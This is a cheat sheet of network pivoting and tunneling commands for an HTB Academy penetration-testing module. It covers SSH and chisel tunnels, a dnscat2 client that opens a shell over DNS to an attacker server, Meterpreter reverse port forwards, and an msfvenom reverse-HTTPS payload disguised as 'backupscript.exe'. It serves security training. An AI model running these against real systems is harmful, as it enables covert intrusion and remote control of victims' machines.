# Pivoting, Tunneling and Port Forwarding — Cheat Sheet

> **Fuente / Source:** [m4riio21/HTB-Academy-Cheatsheets](https://github.com/m4riio21/HTB-Academy-Cheatsheets) (`pivoting-tunneling.md`) — fecha de acceso: 2026-09-24. Módulo HTB Academy: Pivoting, Tunneling, and Port Forwarding.
> **Autor notas:** Apuromafo (curaduría local).

---

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `nmap -sT -p22,3306 <IPaddressofTarget>`                       | Scan a target for open ports allowing SSH or MySQL connections. |
| `ssh -L 1234:localhost:3306 ubuntu@<IPaddressofTarget>`        | Local port forward: local `1234` to remote `3306`. |
| `ssh -D 9050 ubuntu@<IPaddressofTarget>`                       | Dynamic port forward on `9050` (SOCKS proxy). |
| `tail -4 /etc/proxychains.conf`                                | Check last 4 lines of proxychains config. |
| `proxychains nmap -v -sn 172.16.5.1-200`                       | Nmap through Proxychains + SOCKS proxy. |
| `proxychains msfconsole`                                       | Open Metasploit routing all traffic through SOCKS proxy. |
| `msf6 > use auxiliary/server/socks_proxy`                      | Select the `socks_proxy` auxiliary module. |
| `msf6 > use post/multi/manage/autoroute`                       | Select the autoroute module. |
| `meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>` | Forward local `3300` to remote RDP `3389`. |
| `meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>` | Reverse forward to attack host. |
| `meterpreter > bg`                                             | Background the Meterpreter session. |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80`  | Socat listener + forwarder. |
| `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<IPaddressofTarget> -vN` | Reverse SSH tunnel to attack host. |
| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25` | Windows portproxy rule. |
| `netsh.exe interface portproxy show v4tov4`                    | View portproxy rules. |
| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v`          | sshuttle route to internal network. |
| `./chisel server -v -p 1234 --socks5`                          | Chisel server with SOCKS5. |
| `./chisel client -v 10.129.202.64:1234 socks`                  | Chisel client via SOCKS. |
| `sudo ./ptunnel-ng -r10.129.202.64 -R22`                       | ptunnel-ng server (ICMP tunnel). |
| `ssh -p2222 -lubuntu 127.0.0.1`                                | SSH through the ICMP tunnel local port. |
| `regsvr32.exe SocksOverRDP-Plugin.dll`                         | Register SocksOverRDP plugin. |
| `git clone https://github.com/iagox86/dnscat2.git`             | Clone dnscat2 (DNS tunneling). |
| `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache` | Start dnscat2 server. |
| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <secret> -Exec cmd` | dnscat2 client with shell. |
| `dnscat2> window -i 1`                                         | Interact with a dnscat2 session. |
| `plink -D 9050 ubuntu@<IPaddressofTarget>`                     | Plink dynamic forward (Windows proxychains equivalent). |
| `msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> -f exe -o backupscript.exe LPORT=8080` | Generate reverse HTTPS payload. |
| `msf6 > use exploit/multi/handler`                             | Multi-handler listener. |
| `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`           | Copy payload to target. |
| `python3 -m http.server 8123`                                  | Simple HTTP server for file retrieval. |
| `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`  | Ping sweep via Meterpreter. |

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox.

_Fecha de edición: 2026-09-24_
